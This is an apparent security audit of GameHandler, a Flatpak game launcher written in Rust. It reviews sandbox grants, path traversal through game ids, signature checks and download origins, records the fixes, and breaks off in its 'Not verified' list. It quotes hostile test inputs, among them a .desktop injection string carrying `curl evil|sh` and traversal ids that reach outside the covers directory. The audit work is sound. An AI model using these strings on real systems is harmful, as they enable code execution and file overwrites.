# Security and robustness audit

## Scope

This is a read-only audit of the Flatpak sandbox grant and the code that crosses a
trust boundary in GameHandler (`crates/core` = `gamehandler-core`, `crates/app` =
the `gamehandler` binary), performed by reading the source at commit `d56782d`.
The reconnaissance pass was read-only; the fixes it produced landed separately on
branch `audit-hardening` and each row below carries its own **Status** tail.

The seven areas examined were, in order: the `finish-args` grant in
`build-aux/flatpak/com.goshapps.GameHandler.json`, external process launching, URL
handling, panics reachable from external data, path handling, secrets, and the
dependency graph (advisories, duplicates and unused direct dependencies). Every claim below cites a `file:line`; where a claim could
not be settled by reading or running something in this tree it is marked
*unverified* and the test that would settle it is named. Failure points are
classified A (genuine internal invariant, may panic), B (recoverable runtime
failure) and C (invalid external or user input); only A may normally panic. The
headline result is that the two properties the brief asks about are **not
violated by any path found**: no untrusted data reaches a shell or a
string-built command line, and no untrusted URL reaches `xdg-open`. The findings
that follow are a sandbox grant wider than its code justification, one
authentication check materially weaker than it reads, three instances where a
path or filename built from external data is not validated the way the same
class is validated elsewhere in the same tree, and one asymmetry between spawn
sites. A fourth instance of that third class was found while fixing the first
three: the Proton runner archive's URL is fetched with neither the scheme nor the
origin check the installer path applies.

## Findings

| ID | Severity | Finding | Evidence (`file:line`) | Impact | Suggested fix |
|---|---|---|---|---|---|
| SEC-01 | P1 | `--device=all` has no justification in launcher code. It is the widest device grant the sandbox offers, and the only device node any code in `crates/` opens is `/dev/urandom`, which Flatpak's default `/dev` supplies with no `--device` flag at all. There is no occurrence of `/dev/dri`, `/dev/input`, `/dev/hidraw` or `/dev/uinput` anywhere in `crates/`. The grant's real purpose is the *launched game* (GPU, controllers), which is an argument about a child process rather than a `file:line` — and `docs/migration/packaging.md` §3 already forbids keeping it silently: "Do not silently keep `all` without that test." | `build-aux/flatpak/com.goshapps.GameHandler.json:20`; `crates/core/src/models.rs:459` (the only device open in the tree, `/dev/urandom`); `docs/migration/packaging.md` §3 (`--device=all` "KEEP, flagged… Do not silently keep `all` without that test") | `--device=all` exposes every device node the host has granted the user, not just the GPU: raw disk (`/dev/sd*`, `/dev/nvme*`), `/dev/mem` where present, USB and input devices. For a launcher that runs third-party game binaries and Wine, that is the difference between "a compromised game can corrupt the user's files" and "a compromised game can read the raw disk and every keystroke on the machine". | Narrow to `--device=dri`, which is what the Wine child actually needs for the GPU. If controller support genuinely requires more, run the hotplug test `packaging.md` Q-2 asks for and record the test as the justification for the narrowest grant that passes it. Do not keep `all` on the strength of "gamepads classically need it". **Status: FIXED.** Narrowed to the three classes a launched game actually needs — `--device=dri`, `--device=input`, `--device=usb` — at `build-aux/flatpak/com.goshapps.GameHandler.json`. **The before-and-after was measured in the sandbox** rather than argued: under `--device=all` the narrowed-away nodes present in `/dev` were `mem`, `kvm`, `nvme0n1` and its three partitions, `vfio`, `vhost-net`, `vhost-vsock`, `watchdog`, `watchdog0`, `nvram`, `ttyS0-3`, `ppp`, `rfkill`, `hwrng`, `mtd`/`mtd0`/`mtd0ro`, `gpiochip0`, `udmabuf`, `acpi_thermal_rel`, `cpu_dma_latency`, `hpet`, `port`, `snapshot`, `kmsg`, `btrfs-control`, `autofs`, `cuse` and `userio`; under the narrow grant every one of them is gone, while `/dev/dri` and `/dev/input` remain. The three narrow classes cover the controller path because `--device=input` is what exposes `/dev/input` — the question Q-2 wanted a gamepad test for has a documented answer in `flatpak-metadata(5)`, and `--device=all` was never what made gamepads work. `tests/test_packaging.py` now asserts both the narrow set and the **absence** of `--device=all`: the subset check is satisfied by a manifest carrying both grants, so the positive list alone is a guard that cannot fail on the regression it exists for — demonstrated by re-adding `--device=all` and watching the run fail. The application was re-run under the narrowed grant (`--version`, `--list`) before the change was committed. |
| SEC-02 | P2 | `--filesystem=home` grants read-write to the entire home directory, which is broader than the directories the code touches. Every path the launcher reads or writes is enumerable: the covers, prefixes and runners directories under XDG data (`crates/core/src/paths.rs`), `games.json` and `settings.json`, and seven fixed search roots for anti-cheat runtimes. Nothing in the tree reads `~/.ssh`, `~/.gnupg`, a browser profile, another application's `~/.config/<app>`, or another Flatpak's `~/.var/app/<app>` — with the single deliberate exception of the Steam path at `env.rs:221`, which has its own narrower `:ro` grant. | `build-aux/flatpak/com.goshapps.GameHandler.json:21`; `crates/core/src/runners/env.rs:216-224` (the seven roots: `~/.local/share/umu`, `~/.local/share/lutris/runtime`, `~/.local/share/Steam/…`, `~/.var/app/com.valvesoftware.Steam/…`, `/usr/share/umu`, `/usr/share/steam/compatibilitytools.d`, `paths::runners_dir_in`); manifest `:23` for the one path that already has a narrower grant | The grant turns any write-path bug into an arbitrary write anywhere in home — SEC-04 below is exactly such a bug — and lets the app read every other application's private data, including credentials stored by other tools. It is the single largest permission in the manifest and the one whose removal a portal is normally expected to enable. | Replace with `--filesystem=xdg-data`, `--filesystem=xdg-config`, `--filesystem=xdg-cache` plus the fixed roots that fall outside them, and use the document portal for executable selection. If `docs/migration/packaging.md`'s claim that portal choosers cannot substitute is the blocker, test it — see *Not verified* item 4. **Status: FIXED — narrowed to `home:ro` plus one `:create` carve-out, by measurement.** The suggestion above was **not** followed, and the reason is the measurement. `xdg-data`, `xdg-config` and `xdg-cache` are absent from `flatpak info --show-permissions` as the input and present as `XDG_DATA_HOME=~/.var/app/<id>/data` (measured with `flatpak run --command=printenv`), so granting them would have moved the app's *own* files into the sandbox and cut it off from the user's game libraries — the opposite of the finding. `xdg-cache` was dropped entirely: no path in `crates/` reads `XDG_CACHE_HOME` or `.cache`. The portal half is already how the app works (`locate_exe_task`), and *Not verified* item 4 is now settled against the suggestion: the portal **cannot** substitute for the grant, because a portal grant exists only for a path the user picked in a dialog, and the flows that reach a path without one are real (a typed `exe_path`; a shortcut written to the menu). What was done instead: `--filesystem=home` → `--filesystem=home:ro`, adding `--filesystem=~/.local/share/applications:create` for the one write the code genuinely needs there (`shortcut_directory_in`, which targets the user's menu on purpose). **Measured before and after in the sandbox**, not argued: `touch ~/.config/gh-sec02-w2` and `touch ~/.local/share/gh-sec02-w3` both succeeded under the old grant and are both refused under the new one, while the three home-side anti-cheat roots (`~/.local/share/umu`, `~/.local/share/lutris/runtime`, `~/.local/share/Steam/steamapps/common`) stay readable and **a planted executable at `~/.gh-sec02-exec-probe` still runs, exit 0** — which is the one claim `packaging.md` §3 made and had never demonstrated. The carve-out was measured to override the broader read-only grant both ways: create, re-write and remove a `.desktop` file all succeed, while a sibling directory and a traversal back out of it are both refused. `tests/test_packaging.py` asserts the narrowed pair **and** the absence of the bare `--filesystem=home`, because Flatpak's `home` implies `home:ro` and so a positive list alone would pass on the wide grant — demonstrated by re-adding it and watching two tests fail. A third check pins the **set of writable grants**, so a second unreviewed one cannot arrive invisibly; proved by three mutations (`home` re-added, a `~/Games:rw` added, a bare `~/Games` added), each failing a distinct named assertion. |
| SEC-03 | P2 | The Authenticode authenticity decision is weaker than it reads. The publisher test is a case-folded **substring** search over the verifier's whole merged stdout+stderr, not a comparison against a parsed `Subject:` field; and the pinned Microsoft root is passed as `-CAfile`/`-TSA-CAfile` for exactly one of the ten recipes. For the other nine, `microsoft_trust_root` is `false`, no trust anchor is passed, and the decision reduces to "`osslsigncode` exited 0 and printed `Signature verification: ok`" plus "the literal publisher string appears somewhere in the output". | `crates/core/src/installers.rs:1520-1524` (substring over `text.to_lowercase()`); `:1486-1497` (`-CAfile`/`-TSA-CAfile` only under `if installer.microsoft_trust_root`); `:325` (the only recipe with `true`); `:1445` (`AUTHENTICODE_ROOT_NAME`). There is no test counting the recipes that set the flag — only `assert!(ubisoft.microsoft_trust_root)` at `:3580` and the prose claim at `:3571` — so nothing would notice a tenth recipe silently gaining or losing it | If `osslsigncode verify` without `-CAfile` accepts a self-signed certificate, then the check is defeated by a self-signed certificate whose Subject carries the expected publisher string — the signature verifies cryptographically, the exit code is 0, the success line prints, and the substring appears. The download-origin check (`:1347-1371`) still stands in front of it, so exploitability requires control of an allowed host or of the releases JSON; the point is that the publisher test then provides no additional assurance. **The consequence is unverified**: `osslsigncode` is not installed in this environment (`which osslsigncode` → not found), so it was not executed. | Require the pinned root for every recipe — the `.pem` is already installed by the manifest — or parse the `Subject:` line and compare the whole field in order, rather than testing for a substring of the whole output. Settle the unverified half with one run of `osslsigncode verify -in <self-signed PE, Subject CN=Valve Corp.>` and record the exit code. |
| SEC-04 | P2 | `game_id` is interpolated into a destination filename with no sanitisation at three sites in `covers.rs`, while the same class of bug was deliberately fixed in `desktop.rs`. The input is the `id` field of a `games.json` entry, which the app loads verbatim. | `crates/core/src/covers.rs:607` (`covers_dir.join(format!("{game_id}.ico"))`); `:908` (`format!("{game_id}.jpg")`); `:944-948` (`format!("{game_id}.{extension}")` / `format!("{game_id}.jpg")` then `covers_dir.join(file_name)`). Contrast `crates/core/src/runners/desktop.rs:138` (`id_prefix`, which maps every non-`[0-9A-Za-z]` to `-`) and the module note at `:62` recording that the reference's raw `game.id[:8]` interpolation was sanitised in this port precisely because a hand-edited id `"a/../../b"` would otherwise write outside the target directory. | A `games.json` whose entry has `"id": "../../../.config/autostart/x"` makes `save_exe_icon`, `save_cover_from_urls` and `copy_custom_cover` write `~/.config/autostart/x.ico`, `x.jpg` or `x.{png,jpg,jpeg,webp}` — outside `covers_dir`. `save_exe_icon_to` also writes the `.ico.tmp` sibling at the traversed location (`:611-614`), so an interrupted write leaves a stray file there. The content is an icon or an image, so this is an arbitrary-file write rather than direct code execution; combined with SEC-02's `--filesystem=home` the target is anywhere in the home directory. Every caller of these three functions is reachable from the ordinary add-a-game and set-a-cover flows. | Apply `desktop::id_prefix` — or `archive::safe_install_id`, which already exists for exactly this and is applied on the runner side — to `game_id` at all three sites, or refuse an id containing `/`, `\` or a `..` component at load time in `models.rs`. The fix belongs in `covers.rs`, because the same value is validated elsewhere and this is the one module that trusts it. |
**Status: FIXED.** A `cover_stem` helper refuses any id containing `/` or `\`, and
all three writes call it before building their destination — so the refusal
happens before the directory is created, before the `.ico.tmp` sibling is written
and before any transfer is attempted. Measured in the fail direction by restoring
the three pre-fix interpolations: `save_exe_icon_to(&exe, "../escape", &covers)`
returns `Ok("/tmp/gh-covers-traversal-N/covers/../escape.ico")` — the write
succeeds, one level above the directory the caller named — and the regression
test fails on exactly that. Restored, the same call is `Err(UnsafeId)`.
The rule is **one condition and a refusal, not a sanitiser**, and both halves of
that are deliberate. A path separator is the only thing in
`format!("{game_id}.{ext}")` that can traverse: `".."` becomes `"...ico"` and an
empty id becomes `".ico"`, both legal files the reference also writes, so the test
asserts those two are still *accepted* — a refusal-everything implementation
fails it. Rewriting the id instead would rename every existing user's cover files,
which is why `desktop::id_prefix` (which does rewrite, for a filename this port
chooses) is the right shape there and the wrong shape here. `\` is refused
alongside `/` although it is an ordinary character in a Unix filename, so the rule
matches `safe_install_id` and a library carried between machines cannot change
meaning. The application cannot reach the refusal: ids come from
`models::new_id`, 32 lowercase hex characters. What reaches it is a hand-edited or
foreign `games.json`, which is the case the row is about. Committed as
`88578db`.
| SEC-05 | P3 | The Proton runner archive is downloaded from a URL taken verbatim out of the releases JSON, with no scheme and no origin check — unlike the installer download path, which applies both. | `crates/core/src/runners/proton.rs:501` (`download_url: str_or_empty(asset.get("browser_download_url"))`); `:1045` (`client.get(&release.download_url, …)`). Contrast `crates/core/src/installers.rs:1347-1371` (`validate_download_origin`: requires `scheme == "https"` **and** a host in the recipe's `allowed_hosts`, checked against the post-redirect URL). | The listing is fetched from `https://api.github.com/repos/{github}/releases` (`crates/core/src/runners/families.rs:76-78`), so the URL is attacker-chosen only if the family's repository is compromised or TLS to `api.github.com` is broken — but when it is, the app fetches an arbitrary `http://` or third-party URL into a staging file and then extracts and later *executes* the result as a runner. The controls after the download are real and were verified: `safe_install_id` (`:1000`), the private 0700 staging directory with `create_new` on the archive (`:1040-1047`), the declared-length and streamed-size caps (`:1051-1072`), `extract_archive`/`validate_staged_runner` (`:1073-1074`), and `rename_noreplace` (`:1077`). | Require `https` before `client.get`, the same one-line predicate `validate_download_origin` already applies, and optionally pin the asset host to `github.com`/`objects.githubusercontent.com`. **Status: FIXED** — `https` is now required, and the host pin was **dropped after being measured**, which is the part worth recording. `validate_runner_download_url` (`crates/core/src/runners/proton.rs`) is called from `install_with` after the two existing refusals and before `StagingDirectory::create`; it reads the scheme through the same `url_parts` the installer allowlist uses, so there is one URL parser in the tree and not a second. The new `RunnerError::UntrustedOrigin { url }` carries the URL — the reference has no counterpart for this refusal, so the message is modelled on `_validate_download_origin`'s and names what it refused. **`allowed_hosts` is not available to port**: `Installer` has that table because the reference has it for installers, and `RunnerFamily` has no equivalent field, so a host list here would be a second home for family data. Pinning `github.com` is also **wrong**, and this was checked against the live API rather than assumed: `browser_download_url` for `GloriousEggroll/proton-ge-custom` is `https://github.com/.../releases/download/...`, which redirects once (302) to `https://release-assets.githubusercontent.com/github-production-…` with a signed query — all 88 assets of the current listing are on `github.com` and every one of them leaves it. A check applied to the URL from the JSON *could* name `github.com`; one applied to the final URL could not, without pinning a rotating asset host. **What is not covered**, recorded rather than silently left: the redirect target is judged by nothing, so a compromised `https` origin could redirect this download to a plaintext host. Closing that means a second check inside `install_with`'s `on_head` callback — `ResponseHead` already carries `final_url` for exactly this kind of use — and it is a narrower gap than the one closed here, since it needs an `https` origin to set up. Five tests, and each was mutation-proved: removing the call site fails `a_non_https_runner_url_is_refused_before_the_network_is_touched`; inverting the predicate fails both it and the seven-shape `only_an_https_url_is_an_acceptable_runner_download_origin`; validating a constant instead of `&release.download_url` fails the first; and sending the request to a URL other than the validated one fails `an_https_runner_url_is_handed_to_the_client_unmodified`, which is the positive control — `Serve` ignored its `_url` before this row and now records it, because "the refusal precedes the request" and "the request goes to the URL that was checked" are two different claims. **One assertion was written, failed, and corrected rather than deleted**: the test first claimed the refusal happens "before anything is written" and asserted the runners directory was still empty. `StagingDirectory`'s `Drop` erases that evidence either way, so the assertion could not distinguish the orderings — and moving the check below `StagingDirectory::create` left it green. Putting a regular file at the runners path, where `create_dir_all` is `install_with`'s first statement, returned `RunnerError::Io`: the check runs *after* that statement and does create the runners directory on a machine that has none. That is the reference's own first line (`runners.py:875`) and the directory is where the user's builds live, so the code stands and the claim was corrected — the position between `create_dir_all` and the request is the whole of the security content. Committed as `8106f1e`. |
| SEC-06 | P3 | `RunnerManager::get` joins a `games.json`-sourced `runner_id` onto the runners directory without validating it, where three other sites validate the same kind of string. | `crates/core/src/runners/mod.rs:1087-1096` (`self.runners_directory.join(runner_id)`). Contrast `crates/core/src/runners/proton.rs:934`, `:1000` and `:1114`, all of which pass the equivalent identifier through `safe_install_id`, and `proton.rs:611`, which does so with an explicit fallback. | A `games.json` entry with `"runner": "../../../tmp/x"` makes `ProtonRunner::new` treat any directory as a build (`mod.rs:648`). If that directory holds a file named `proton`, `build_command` (`mod.rs:735-745`) invokes `umu-run` with `PROTONPATH` pointed at it; if not, `find_wine_binary` searches it for a Wine binary as the plain-Wine fallback. There is no path here that executes anything the user's filesystem does not already contain, and `games.json` is user-owned — which is why this is P3: the escalation over "point `exe_path` at a program" is that the runner directory no longer has to be one the app installed. | `safe_install_id(runner_id)` and fall back to `system_wine` on `Err`, matching `is_installed` and `uninstall`. |
| SEC-07 | P3 | `open_url` performs no scheme validation, and its message payload is a plain `String` rather than a catalogue-constant type. Every producer reachable today is a compile-time constant, so the property currently holds by construction and by tests — not by a runtime check and not by the type. | `crates/app/src/main.rs:2822-2826` (`Command::new("xdg-open").arg(url)`); `:2840-2847`; `Message::OpenUrl(String)` at `:726`; the handler at `:2194-2196`. Producers: `crates/core/src/credits.rs` (`Credit { url: &'static str }`), `crates/core/src/runners/families.rs:76-83` (`releases_url()` / `homepage()` from the compile-time family catalogue), delivered at `crates/app/src/view/runners.rs:613` and `:627`. The "always `https://`" property is asserted by a **test** at `crates/core/src/credits.rs:623` and `crates/app/src/view/credits.rs:555`. | `xdg-open` dispatches on the scheme, so the day a `String` originating in `games.json`, `settings.json`, a manifest or a network response reaches `OpenUrl`, `file://` and any registered handler that accepts an argument become reachable with no further change anywhere. The doc comment at `main.rs:2813-2821` states the concern itself ("a `String` payload is a `String` payload") and then relies on the compiler not to matter. The absence of a shell is not in question: the URL is one argv element, so `;`, `&` and backticks are literal characters. | Reject a URL whose scheme is not `https` immediately before `spawn` — one predicate, and it makes the invariant local to the sink — and/or change the payload to a newtype constructible only from a catalogue constant. |
| SEC-08 | P3 | Three manifest permissions are justified only by the child process, with no direct launcher-code tie; the permissions that *do* tie to code are recorded here so the distinction is auditable. | `--share=ipc` (`manifest:15`) and `--socket=pulseaudio` (`manifest:18`): a search of `crates/` for `PULSE_`, `pulse`, `shm` and `/dev/shm` finds nothing outside test strings, so the requirement is the launched Wine/Proton process (X11 MIT-SHM, audio output). `--allow=multiarch` (`manifest:19`) is closer to the code — `install_bundled_dxvk` reads `WINEARCH` and selects a 32-bit prefix layout (`crates/core/src/runners/launch_opts.rs:449-455`, with the 32-bit layout selected at `:465-468`) — but the launcher never itself executes a 32-bit binary; the i386 Wine comes from `org.freedesktop.Platform.Compat.i386` at `manifest:26-29` and runs as the child. The permissions that *do* tie directly to code: `--share=network` → `crates/app/src/http.rs` (the sole `HttpClient`), `crates/core/src/installers.rs:1753`, `crates/core/src/runners/proton.rs:1045`; `--socket=wayland` / `--socket=fallback-x11` → the winit window, whose display probing is documented at `crates/app/src/main.rs:345-390`; `--filesystem=xdg-run/gvfs` → `crates/core/src/netpaths.rs:192-202` (`gvfs_root()` reads `$XDG_RUNTIME_DIR/gvfs`), consumed at `:126`; `--env=PATH=…gamescope…` → `crates/core/src/runners/launch_opts.rs:745` (`launch_env.which("gamescope")`) and the Flathub-extension message at `crates/core/src/runners/mod.rs:236-239`. | No additional exposure beyond SEC-01 and SEC-02: all three are already the narrow form (there is no `--socket=session-bus`, no `--filesystem=host`, and `--allow=multiarch` is scoped to the i386 runtime rather than being a device grant). The finding is that three of the twelve `finish-args` entries are justified by an argument about a child process rather than by a `file:line`, so nothing in the tree would notice if the child stopped needing them. | Record the child-process tie in `docs/migration/packaging.md` §3 explicitly, next to the `--device=all` entry, so a future narrowing pass can tell the two kinds of permission apart. No narrowing is available today. |
| SEC-09 | P3 | Two of the app's process spawns inherit the launcher's entire environment, and they are the two security-relevant ones: the package-manager install and the Authenticode verifier. Every other spawn replaces the environment first. | `crates/app/src/view/plugins.rs:210-219` (`run_to_completion`: `Command::new(program).args(args)` with no `env_clear`), reached through `crates/core/src/plugins.rs:356-386` to `pkexec`/`sudo`; `crates/core/src/installers.rs:1707-1721` (`run_capturing`, `ProcessCommand::new(program).args(arguments)` with no `env_clear`), called from `:1540`. Every other spawn clears: `crates/app/src/main.rs:2937` (`start_prefix_tool`), `:3360` (`run_installer`), `crates/core/src/installers.rs:2138` (`run_with_env`). | The children see `LD_PRELOAD`, `LD_LIBRARY_PATH`, `http_proxy`, `SUDO_ASKPASS`, `GAMEHANDLER_*` and anything else the invoking shell carried. Reachability is limited: inside the Flatpak, `PATH` is fixed by `manifest:24` and the host environment does not propagate into the sandbox at all; outside it, the environment belongs to the user who launched the app; and `sudo` and `pkexec` sanitise their own environments. So this is a genuine inconsistency with security-relevant call sites, not a demonstrated escalation, and it is reported as such. | `.env_clear()` at both sites, as the other three spawns already do. `run_capturing` needs nothing in the child's environment: `osslsigncode` is resolved by `which` in the parent at `installers.rs:1516`, and so is the privilege helper at `plugins.rs:383`. Removing `$PATH` is therefore safe **only** because neither child is ever named by a bare string that the kernel has to search for. **Status: FIXED.** Both sites now clear, and each fix is proven by a test that dumps the child's own environment from inside the child. Measured against the reverted body, the package manager inherited **103** variables from the launcher, including `LD_LIBRARY_PATH`, `SSL_CERT_FILE` and `SSL_CERT_DIR`; the verifier inherited **102**. With the fix, both children report an empty environment after `PWD`, `SHLVL` and `OLDPWD` are excluded — `sh` sets those three itself, verified with `env -i /bin/sh -c 'export -p'`, which prints exactly those and nothing else. Two things were established by running code rather than by reading `std`'s documentation, because the fix's safety rests on both. First, that `env_clear` cannot break the program lookup: with the clear applied *and* the child's `PATH` set to a nonexistent directory, a bare program name still spawns — `std` runs its search loop in the parent, before the child exists, so the clear only changes what the child reads. Second, that a cleared environment is a *complete* one for these two children specifically: the verifier's binary, its argv and its trust root are all absolute paths, and the package manager's argv is an absolute helper plus catalogue constants that `pkexec` and `sudo` resolve against their own secure `PATH`. This is recorded as a **deliberate divergence**, not a transcription error: the reference's `subprocess.run` passes no `env=` at `installers.py:579-586`, so this port is choosing security over fidelity, on the brief's own decision order. The cost is bounded and visible — a spawn that fails now reports as a failed plugin install rather than silently proceeding — and it is stated in each site's doc comment. |

| SEC-10 | P3 | **Dependency hygiene, reviewed as the brief requires: five live RustSec advisories against the locked graph, and no duplicate or unused direct dependency.** Nothing here is exploitable today, and that is the finding — the two that *are* unsound have no reachable call path from this application, and the three that are unmaintained are informational. The repository had never been checked against an advisory database, so the state was unknown rather than clean. | Method: `RustSec/advisory-db` cloned at 2026-09-13 (922 crates), every `[[package]]` in `Cargo.lock` matched against it, with positive controls (the matcher flags `time 0.1.0`, `openssl 0.10.0`, `smallvec 0.6.0`) and negative controls (it clears `time 0.3.44`, `openssl 0.10.99`) — the first version of this matcher read only `*.toml` and silently opened no advisory at all, reporting a false all-clear. **Five live:** `lru 0.16.4` RUSTSEC-2026-0253 (unsound, use-after-free in `LruCache::pop()`, patched `>= 0.18.2`), `memmap2 0.8.0` RUSTSEC-2026-0186 (unsound, OOB in six range methods, patched `>= 0.9.11`), `paste 1.0.15` RUSTSEC-2024-0436, `rustybuzz 0.20.1` RUSTSEC-2026-0206, `ttf-parser 0.25.1` RUSTSEC-2026-0192 (all three unmaintained-only). **Three more that my matcher flagged and that are not findings** — `dirs` RUSTSEC-2020-0053, `ring` RUSTSEC-2025-0007, `xml-rs` RUSTSEC-2022-0048 — were all `withdrawn` by RustSec and were excluded. | **Not reachable, established rather than assumed.** `lru` sits on the `icy_sixel`/`cryoglyph` → `iced_wgpu` path, and the shipped binary is the software renderer: `strings target/debug/gamehandler` matches `tiny_skia` 44,912 times and `wgpu` **0** times, so the unit is not linked in. `memmap2` is reached only by `xkbcommon 0.7.0`, which calls `MmapOptions::new().map(...)` and four other non-advisory methods — `grep -rn 'advise_range\|flush_range\|unchecked_advise' ` over the vendored source finds **no** occurrence of any of the six affected functions. `paste` reaches us only through `wgpu-hal` → `metal`, which is macOS-only. | No fix is available at our layer: all five are transitive pins owned by libcosmic/iced, and the brief forbids upgrading for version numbers alone. **Action taken:** recorded here, with the reachability argument, so that a change to the renderer path or to the xkbcommon call path re-opens it deliberately rather than silently. **Action for the next libcosmic bump:** `lru >= 0.18.2` and `memmap2 >= 0.9.11` clear both unsound advisories, so the check is a two-version comparison against the new graph, not a re-audit. |

## Verified safe

The following were checked by reading the source, and are genuinely handled
correctly. They are recorded because several of them are the mitigations the
findings above depend on.

1. **No shell anywhere in the launch or install path.** All ten non-test spawn
   sites construct an argv vector and hand it to `Command`/`Process`:
   `crates/core/src/runners/launch.rs:394`, `:373`; `crates/core/src/runners/mod.rs:570`;
   `crates/core/src/installers.rs:1647`, `:2043`; `crates/app/src/view/plugins.rs:190`;
   `crates/app/src/main.rs:2765`, `:2804`, `:2823`, `:3150`. Every `/bin/sh` or
   `sh -c` occurrence in the tree is inside a `#[cfg(test)]` module
   (`runners/mod.rs:1809,1865` — module opens at `:1155`; `launch.rs:1000` —
   opens at `:504`; `view/plugins.rs:513` — opens at `:291`;
   `installers.rs:4245` — opens at `:2178`) or is the hostile-string literal in
   `runners/desktop.rs:428`. There is no `sh -c` with untrusted data anywhere.
2. **A game's `exe_path` and `arguments` never become a command line.**
   `build_linux_command` (`launch_opts.rs:781-795`) starts `argv` as
   `vec![game.exe_path.clone()]` and appends through `push_arguments`
   (`runners/mod.rs:391-397`) into `Command { argv, env }` (`:378-382`), which
   `launch` hands to `Process::new(&argv[0]).args(&argv[1..])`
   (`launch.rs:394-395`). `shell.rs`'s `split_posix` is a CPython `shlex.split`
   port producing a `Vec<String>`; nothing re-joins it into a string.
3. **`game.additional_app` is passed as one argv element, never shell-split.**
   `launch.rs:364-372` pushes `extra.to_string()` as a single element, so a value
   containing `;`, `|` or a backtick is part of a filename rather than a second
   command — and when the runner executable is non-empty the program executed is
   still the runner, with the extra app as its argument.
4. **A game's own `environment` block cannot redirect the bundled-DXVK source.**
   `launch.rs:336-356` reads `GAMEHANDLER_DXVK_ROOT` through
   `crate::paths::Env::var(env, …)` — the *process* environment — while
   `parse_env_block(&game.environment)` feeds a separate map, and the code says
   so at `:346-355`. `install_bundled_dxvk` (`launch_opts.rs:390-480`) then
   copies only `*.dll` entries, by `file_name()`, into
   `<prefix>/drive_c/windows/{system32,syswow64}`.
5. **The installer download path is origin-checked and fails closed.**
   `validate_download_origin` (`installers.rs:1347-1371`) requires `https` **and**
   a host in the recipe's `allowed_hosts`, tested against the post-redirect
   `final_url` that `crates/app/src/http.rs` reports before any body byte.
   `verify_installer_authenticity` (`:1472-1529`) returns
   `SignatureToolMissing` rather than `Ok` when `osslsigncode` is absent
   (`:1476-1478`), requires **both** exit status 0 and the literal success line
   (`:1509-1511`) before the publisher test, and `authenticode_root_path`
   (`:1417-1440`) returns `AuthenticodeRootUnavailable` rather than verifying
   without the pinned root when the `.pem` cannot be found. The
   `SignatureInvalid` tail is bounds-safe (`:1512-1514`,
   `lines[lines.len().saturating_sub(8)..]`). `validate_installer_magic`
   (`:1381-1409`) describes itself as "a cheap shape check, not a security
   control", which is accurate.
6. **The Flatpak package-manager escape is closed in code, not only in the
   README.** `plugins.rs:327-334` returns `InstallError::Flatpak` when
   `in_flatpak(env)` (`:244-248`: `FLATPAK_ID` or `/.flatpak-info`), every
   manager arm's argv is a compile-time literal (`:343-349`) with the package name
   from `package_for` (`:76`), and the `pkexec`/`sudo` fallback (`:362-376`) is
   consequently unreachable inside the sandbox — and would not work there anyway,
   since the manifest grants no `--system-talk-name=org.freedesktop.PolicyKit1`.
   This is the mitigation that keeps SEC-01 and SEC-02 from compounding into a
   system-wide package install.
7. **The `.desktop` writer neutralises the injection it is exposed to.**
   `escape_desktop_value` (`desktop.rs:110`) escapes `\`, `\n`, `\r` and `\t`;
   `desktop_exec` (`:124-127`) additionally doubles `%` so a path cannot smuggle a
   field code into `Exec=`; `id_prefix` (`:138`) maps every non-`[0-9A-Za-z]`
   character to `-`; and the `Exec=` line is `gamehandler --launch <id>`
   (`:236`), not the game's own path. A game named
   `"Doom\nExec=/bin/sh -c 'curl evil|sh'\nName=Doom"` cannot add a second
   `Exec=` line, and the test at `:428` drives exactly that string.
8. **The untrusted-tarball module refuses the shapes that matter.**
   `archive::safe_install_id` (`archive.rs:232-241`), `sanitise_release_tag`
   (`:251-283`), `destination_path` (`:400-425`), `normalise_link_target`
   (`:440-456`), `plan_member` (`:486`), the member-count, size and decompression
   caps in `extract_archive_with`/`extract_members` (`:587`, `:622`), and
   `validate_staged_runner` — which rejects special files, absolute link targets,
   links that escape the extraction root, and a forged `.gamehandler.json`, and
   which is run against the tree as it will land (`proton.rs:1073-1074`, with the
   property asserted at `proton.rs:2555-2560`). The remote archive's own name is
   never used as a local path: it is always staged as `runner.archive`
   (`proton.rs:1025`), so an asset named `../x.tar.gz` never becomes a path.
9. **External-data parsers use checked arithmetic rather than merely
   non-panicking tests.** `json.rs` (`string_end`, `number_end`, `sanitize`,
   `clamp_depth` — every index provably ≤ `len`); `netpaths.rs`
   (`item.as_bytes()[2..]` sits behind `hex_pair`'s `get(..2)?`);
   `exe_icons.rs` (`checked_add`, `saturating_*`, `data.get(a..b)`);
   `launch_opts.rs:130-158` `decode_utf8_ignoring`, whose `rest = &rest[next..]`
   is guarded by `if next >= rest.len() { return decoded; }`;
   `runners/mod.rs:781-783` `take_chars` (char-based, so it cannot split a
   codepoint); `installers.rs:1512-1514`. No computed-index slice, integer
   overflow or truncating `as` cast reachable from external data was found.
10. **Non-test panics are three, and all three are class A.** `main.rs:979`
    `.expect("every Page is in Page::ALL")`; `main.rs:1866`
    `tasks.pop().expect("the apply task was just pushed")`, guarded by the
    `match tasks.len()` immediately above it; and `covers.rs:1059-1068`'s
    `u8::from_str_radix(&digest[0..2], 16).expect(…)`, over a `sha256_hex` output
    that always writes at least two hex characters. The other 900-odd occurrences
    of `unwrap`/`expect`/`panic!`/`unreachable!`/`todo!` are inside
    `#[cfg(test)]` modules or in `crates/core/src/oracle_tests.rs`.
11. **No secrets, tokens, API keys or credential material in `crates/`.** The only
    environment variables read are `HOME`, `PATH`, `XDG_*`, `FLATPAK_ID`,
    `DISPLAY`/`WAYLAND_DISPLAY`/`WAYLAND_SOCKET`, `GAMEHANDLER_DXVK_ROOT` and
    `GAMEHANDLER_AUTHENTICODE_ROOT` (`paths.rs:37`, `runners/env.rs:65-79`,
    `plugins.rs:201`, `launch.rs:352`, `installers.rs:1422`). The only non-test
    output is the `--list` rows (`main.rs:158-177`) and the CLI's own error
    sentences (`main.rs:310`, `:326`, `:336`); no user data is logged.
12. **Runner install ids are validated on the install, uninstall and discovery
    paths.** `proton.rs:934`, `:1000` and `:1114` all pass a release- or
    directory-derived name through `safe_install_id`; `proton.rs:1099-1108`
    documents why the uninstall guard compares the raw and trimmed forms
    differently for `SYSTEM_WINE`; and `proton.rs:611`'s
    `safe_install_id(&install_id).unwrap_or(install_id)` is a defensive fallback
    over a value `families::install_id_for` has already put through
    `safe_install_id` (`families.rs:583`, `:588`), so it cannot be reached with an
    unvalidated string.

## Not verified

Each item below is something this audit could not settle from the tree, with the
test that would settle it.

1. **The permissions the built bundle actually carries — SETTLED, and the
   answer was not the manifest.** `flatpak info --show-permissions
   com.goshapps.GameHandler` was run against the installed 0.8.0 build. The
